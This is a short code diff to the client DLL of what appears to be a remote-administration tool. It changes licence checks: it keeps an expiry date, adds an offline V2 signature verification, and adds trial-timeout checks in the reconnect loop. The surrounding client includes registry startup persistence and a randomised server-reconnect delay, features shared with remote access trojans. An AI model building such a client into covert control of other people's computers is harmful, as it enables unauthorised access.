@@ -4,6 +4,8 @@
 #include "stdafx.h"
 #include "ClientDll.h"
 #include <common/iniFile.h>
+#include <common/LANChecker.h>
+#include <common/VerifyV2.h>
 extern "C" {
 #include "reg_startup.h"
 #include "ServiceWrapper.h"
@@ -523,10 +525,13 @@ DWORD WINAPI StartClient(LPVOID lParam)
         // The main ClientApp.
         settings.SetServer(list[0].c_str(), settings.ServerPort());
     }
-    std::string auth;
-    if (IsAuthKernel(auth)) ParseAuthServer(&settings);
+    std::string expiredDate;
+    BOOL isAuthKernel = IsAuthKernel(expiredDate);
+    if (isAuthKernel) ParseAuthServer(&settings);
     iniFile cfg(CLIENT_PATH);
     std::string pubIP = cfg.GetStr("settings", "public_ip", "");
+    // V2 authorization supports offline mode, verify signature and skip timeout check
+    VERIFY_V2_AND_SET_AUTHORIZED();
     State& bExit(app.g_bExit);
     IOCPClient  *ClientObject = NewNetClient(&settings, bExit, pubIP);
     if (nullptr == ClientObject) return -1;
@@ -549,14 +554,16 @@ DWORD WINAPI StartClient(LPVOID lParam)
             Mprintf("[ConnectServer] ---> %s:%d.\n", settings.ServerIP(), settings.ServerPort());
             for (int k = 300+(IsDebug ? rand()%600:rand()%6000); app.m_bIsRunning(&app) && --k; Sleep(10));
             SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
+            // Check auth timeout for trial/unauthorized users while waiting to reconnect
+            if (isAuthKernel && AuthTimeoutChecker::NeedCheck())
+                AuthTimeoutChecker::Check();
             continue;
         }
         SAFE_DELETE(Manager);
 
         //准备第一波数据
-        BOOL auth = FALSE;
-        LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, auth);
-        Manager = auth ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
+        LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, expiredDate);
+        Manager = isAuthKernel ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
                   new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
         Manager->SetLoginMsg(login.szStartTime + std::string("|") + std::to_string(settings.clientID));
         while (ClientObject->IsRunning() && ClientObject->IsConnected() && !ClientObject->SendLoginInfo(login))
